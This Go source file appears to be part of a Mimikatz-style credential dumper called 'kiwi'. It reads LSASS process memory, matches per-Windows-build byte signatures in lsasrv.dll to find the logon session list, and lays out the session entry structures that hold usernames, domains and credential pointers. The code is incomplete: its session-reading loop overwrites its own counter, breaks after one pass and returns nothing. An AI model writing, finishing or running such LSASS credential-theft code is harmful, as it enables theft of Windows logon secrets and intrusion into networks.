package kiwi

import (
	"bytes"
	"fmt"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

type patchPattern struct {
	length int
	data   []byte
}

type patchOffsets struct {
	off0 int
	off1 int
	off2 int
	off3 int
}

type patchGeneric struct {
	search  *patchPattern
	patch   *patchPattern
	offsets *patchOffsets
}

// x64
var (
	patternWin5X64LogonSessionList = []byte{
		0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8,
	}
	patternWin60X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x85, 0xC0, 0x41, 0x89, 0x75, 0x00, 0x4C, 0x8B, 0xE3, 0x0F, 0x84,
	}
	patternWin61X64LogonSessionList = []byte{
		0x33, 0xF6, 0x45, 0x89, 0x2F, 0x4C, 0x8B, 0xF3, 0x85, 0xFF, 0x0F, 0x84,
	}
	patternWin63X64LogonSessionList = []byte{
		0x8B, 0xDE, 0x48, 0x8D, 0x0C, 0x5B, 0x48, 0xC1, 0xE1, 0x05, 0x48, 0x8D, 0x05,
	}
	patternWin6xX64LogonSessionList = []byte{
		0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74,
	}
	patternWin1703X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}
	patternWin1803X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}
	// key = build
	lsaSrvX64References = map[uint32]*patchGeneric{
		buildWinXP: {
			search: &patchPattern{
				length: len(patternWin5X64LogonSessionList),
				data:   patternWin5X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 0},
		},
		buildWin2003: {
			search: &patchPattern{
				length: len(patternWin5X64LogonSessionList),
				data:   patternWin5X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: -45},
		},
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin60X64LogonSessionList),
				data:   patternWin60X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 21, off1: -4},
		},
		buildWin7: {
			search: &patchPattern{
				length: len(patternWin61X64LogonSessionList),
				data:   patternWin61X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 19, off1: -4},
		},
		buildWin8: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		buildWinBlue: {
			search: &patchPattern{
				length: len(patternWin63X64LogonSessionList),
				data:   patternWin63X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 36, off1: -6},
		},
		buildWin10v1507: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		buildWin10v1703: {
			search: &patchPattern{
				length: len(patternWin1703X64LogonSessionList),
				data:   patternWin1703X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		buildWin10v1803: {
			search: &patchPattern{
				length: len(patternWin1803X64LogonSessionList),
				data:   patternWin1803X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		buildWin10v1903: {
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
	}
)

// x86

func (kiwi *Kiwi) searchSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
	if err != nil {
		return err
	}
	// read lsasrv.dll memory
	memory := make([]byte, lsasrv.size)
	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
	}
	// search logon session list pattern
	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.WithMessage(err, "failed to search logon session list pattern")
	}
	// read logon session list address
	address := lsasrv.address + uintptr(index+patch.offsets.off0)
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list address")
	}
	logonSessionListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "logon session list address is 0x%X", logonSessionListAddr)
	// read logon session list count
	address = lsasrv.address + uintptr(index+patch.offsets.off1)
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list count")
	}
	logonSessionListCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "logon session list count address is 0x%X", logonSessionListCountAddr)
	kiwi.logonSessionListAddr = logonSessionListAddr
	kiwi.logonSessionListCountAddr = logonSessionListCountAddr
	return nil
}

type msv10List63 struct {
	fLink         uintptr // point to msv10List63
	bLink         uintptr // point to msv10List63
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	luid0         windows.LUID
	luid1         windows.LUID
	waZa          [12]byte
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	typ           api.LSAUnicodeString
	sid           uintptr
	logonType     uint32
	unknown18     uintptr
	session       uint32
	logonTime     int64
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	unknown23     uint32
	unknown24     uint32
	unknown25     uint32
	unknown26     uint32
	unknown27     uintptr
	unknown28     uintptr
	unknown29     uintptr
	credentialMgr uintptr
}

type lsaEnum struct {
	size                  uintptr
	offsetToLUID          uint32
	offsetToLogonType     uint32
	offsetToSession       uint32
	offsetToUsername      uint32
	offsetToDomain        uint32
	offsetToCredentials   uint32
	offsetToSID           uint32
	offsetToCredentialMgr uint32
	offsetToLogonTime     uint32
	offsetToLogonServer   uint32
}

// key = minimum windows build
var lsaEnums = map[uint32]*lsaEnum{
	buildMinWin10: {
		size:         unsafe.Sizeof(msv10List63{}),
		offsetToLUID: uint32(unsafe.Offsetof(msv10List63{}.luid0)),
	},
}

func (kiwi *Kiwi) getSessionList(pHandle windows.Handle, patch *patchGeneric) ([]byte, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.logonSessionListAddr == 0 {
		err := kiwi.searchSessionListAddress(pHandle, patch)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search session list address")
		}
	}
	// get session list count
	var count uint32
	address := kiwi.logonSessionListCountAddr
	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read session list count")
	}
	kiwi.log(logger.Debug, "logon session list count is", count)

	fmt.Println(unsafe.Sizeof(msv10List63{}))

	// get session list
	for i := uint32(0); i < count; i++ {
		address = kiwi.logonSessionListAddr
		_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read session list count")
		}
		break
	}

	return nil, nil
}
